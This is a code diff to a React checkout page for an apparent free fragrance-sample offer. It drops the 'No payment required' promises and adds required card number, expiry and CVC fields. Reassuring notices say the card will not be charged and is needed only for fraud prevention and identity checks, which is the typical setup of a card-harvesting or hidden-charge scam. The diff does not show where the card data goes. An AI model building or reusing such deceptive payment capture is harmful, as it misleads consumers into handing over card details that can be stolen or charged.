@@ -1,6 +1,6 @@
 import React, { useState } from "react";
 import { Link } from "react-router-dom";
-import { ArrowLeft, Package, MapPin } from "lucide-react";
+import { ArrowLeft, Package } from "lucide-react";
 import { useCart } from "../context/CartContext";
 
 const Checkout: React.FC = () => {
@@ -12,6 +12,9 @@ const Checkout: React.FC = () => {
     address: "",
     city: "",
     postalCode: "",
+    cardNumber: "",
+    expiryDate: "",
+    cvc: "",
   });
   const [isSubmitted, setIsSubmitted] = useState(false);
 
@@ -45,10 +48,10 @@ const Checkout: React.FC = () => {
           </div>
           <h2 className="text-2xl font-bold text-gray-900 mb-2">Request Received!</h2>
           <p className="text-gray-600 mb-4">
-            Your free sample collection will be shipped to {formData.fullName} within 3-7 business days.
+            Your sample collection will be shipped to {formData.fullName} within 3-7 business days.
           </p>
           <p className="text-sm text-gray-500">
-            No payment required. Completely free with tracking included.
+            No charges applied. Tracking included.
           </p>
           <Link
             to="/"
@@ -81,8 +84,8 @@ const Checkout: React.FC = () => {
           {/* Sample Collection Summary */}
           <div className="bg-white p-8 rounded-lg shadow-sm border mb-8">
             <div className="text-center mb-6">
-              <h2 className="text-2xl font-bold text-gray-900 mb-2">Your Free Sample Collection</h2>
-              <p className="text-gray-600">Complete your address to receive all {sampleCount} premium fragrance samples</p>
+              <h2 className="text-2xl font-bold text-gray-900 mb-2">Your Sample Collection</h2>
+              <p className="text-gray-600">Complete your information to receive all {sampleCount} premium fragrance samples</p>
             </div>
 
             {/* Sample Items */}
@@ -97,7 +100,7 @@ const Checkout: React.FC = () => {
                       <p className="font-medium text-gray-900">{item.title}</p>
                       <p className="text-sm text-gray-500">2ml Premium Sample</p>
                     </div>
-                    <span className="text-green-600 font-medium">FREE</span>
+                    <span className="text-green-600 font-medium">Complimentary</span>
                   </div>
                 ))
               ) : (
@@ -119,7 +122,7 @@ const Checkout: React.FC = () => {
                 </li>
                 <li className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-green-500 rounded-full"></div>
-                  Free worldwide shipping with tracking
+                  Worldwide shipping with tracking included
                 </li>
                 <li className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-green-500 rounded-full"></div>
@@ -127,7 +130,7 @@ const Checkout: React.FC = () => {
                 </li>
                 <li className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-green-500 rounded-full"></div>
-                  No payment required, no hidden costs
+                  No charges applied, no hidden costs
                 </li>
               </ul>
             </div>
@@ -136,25 +139,19 @@ const Checkout: React.FC = () => {
             <div className="border-t pt-4">
               <div className="flex justify-between items-center">
                 <span className="text-lg font-semibold text-gray-900">Total Cost</span>
-                <span className="text-2xl font-bold text-green-600">FREE</span>
+                <span className="text-2xl font-bold text-green-600">$0.00</span>
               </div>
-              <p className="text-sm text-gray-500 mt-1">No payment required • Completely free</p>
+              <p className="text-sm text-gray-500 mt-1">No charges will be applied to your card</p>
             </div>
           </div>
 
-          {/* Address Form */}
+          {/* Address and Payment Form */}
           <form onSubmit={handleSubmit} className="space-y-6">
             {/* Shipping Information */}
             <div className="bg-white p-6 rounded-lg shadow-sm border">
-              <div className="flex items-center gap-3 mb-4">
-                <MapPin className="w-5 h-5 text-gray-600" />
-                <h2 className="text-lg font-semibold text-gray-900">
-                  Shipping Address
-                </h2>
-              </div>
-              <p className="text-gray-600 mb-6 text-sm">
-                Provide your address to receive your free sample collection. No payment required.
-              </p>
+              <h2 className="text-lg font-semibold text-gray-900 mb-4">
+                Shipping Information
+              </h2>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div className="md:col-span-2">
@@ -256,27 +253,68 @@ const Checkout: React.FC = () => {
               </div>
             </div>
 
-            {/* Trust Signals */}
-            <div className="bg-gray-50 p-6 rounded-lg border">
-              <h3 className="font-medium text-gray-900 mb-4">What happens next?</h3>
-              <div className="space-y-3 text-sm text-gray-600">
-                <div className="flex items-center gap-3">
-                  <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                    <div className="w-2 h-2 bg-green-600 rounded-full"></div>
+            {/* Payment Method */}
+            <div className="bg-white p-6 rounded-lg shadow-sm border">
+              <h2 className="text-lg font-semibold mb-4">Payment Method</h2>
+
+              {/* Fraud Prevention Notice */}
+              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
+                <h3 className="font-medium text-blue-900 mb-2">Fraud Prevention Required</h3>
+                <p className="text-sm text-blue-800">
+                  Card information is required for fraud prevention and security purposes only.
+                  No charges will be applied to your card for these complimentary samples.
+                </p>
+              </div>
+
+              <div className="space-y-4">
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 mb-1">
+                    Card Information
+                  </label>
+                  <input
+                    type="text"
+                    name="cardNumber"
+                    value={formData.cardNumber}
+                    onChange={handleInputChange}
+                    placeholder="1234 1234 1234 1234"
+                    required
+                    className="w-full px-3 py-2 border border-gray-300 rounded-t-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
+                  />
+                  <div className="flex">
+                    <input
+                      type="text"
+                      name="expiryDate"
+                      value={formData.expiryDate}
+                      onChange={handleInputChange}
+                      placeholder="MM / YY"
+                      required
+                      className="w-1/2 px-3 py-2 border border-gray-300 border-t-0 border-r-0 rounded-bl-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
+                    />
+                    <input
+                      type="text"
+                      name="cvc"
+                      value={formData.cvc}
+                      onChange={handleInputChange}
+                      placeholder="CVC"
+                      required
+                      className="w-1/2 px-3 py-2 border border-gray-300 border-t-0 rounded-br-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
+                    />
                   </div>
-                  <span>We process your address (no payment required)</span>
+                  <div className="flex justify-end mt-1">
+                    <div className="flex gap-1">
+                      <img src="https://cdn.builder.io/api/v1/image/assets%2Faa57fa3495ed440bb8d5e43633a5eae3%2Fe457fa9036bf4fd3a93307c16ee65110" alt="Visa" className="w-8 h-5" />
+                      <img src="https://cdn.builder.io/api/v1/image/assets%2Faa57fa3495ed440bb8d5e43633a5eae3%2Fb06545ee54ef4728b9c82a7890201872" alt="Mastercard" className="w-8 h-5" />
+                      <img src="https://cdn.builder.io/api/v1/image/assets%2Faa57fa3495ed440bb8d5e43633a5eae3%2Fe5bf55e2a0254ef7ae67630f47ff626e" alt="Amex" className="w-8 h-5" />
+                    </div>
+                  </div>
                 </div>
-                <div className="flex items-center gap-3">
-                  <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                    <div className="w-2 h-2 bg-green-600 rounded-full"></div>
-                  </div>
-                  <span>Your samples ship within 24 hours with tracking</span>
-                </div>
-                <div className="flex items-center gap-3">
-                  <div className="w-6 h-6 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                    <div className="w-2 h-2 bg-green-600 rounded-full"></div>
-                  </div>
-                  <span>Receive your premium sample collection in 3-7 days</span>
+
+                <div className="bg-gray-50 p-4 rounded-lg">
+                  <h4 className="font-medium text-gray-900 mb-2">Security Notice</h4>
+                  <p className="text-sm text-gray-600">
+                    Your card will not be charged. This information is used solely for fraud prevention
+                    and to verify your identity for our complimentary sample program.
+                  </p>
                 </div>
               </div>
             </div>
@@ -287,15 +325,15 @@ const Checkout: React.FC = () => {
               className="w-full bg-black text-white py-4 rounded-lg font-medium hover:bg-gray-800 transition-colors text-lg flex items-center justify-center gap-2"
             >
               <Package className="w-5 h-5" />
-              Request Free Samples
+              Request Sample Collection
             </button>
 
             <div className="text-center">
               <p className="text-sm text-gray-500 mb-2">
-                Completely free with worldwide shipping included
+                Complimentary samples with worldwide shipping included
               </p>
               <p className="text-xs text-gray-400">
-                No payment required • No hidden costs • Delivered in 3-7 days
+                No charges applied • Delivered in 3-7 days
               </p>
             </div>
           </form>
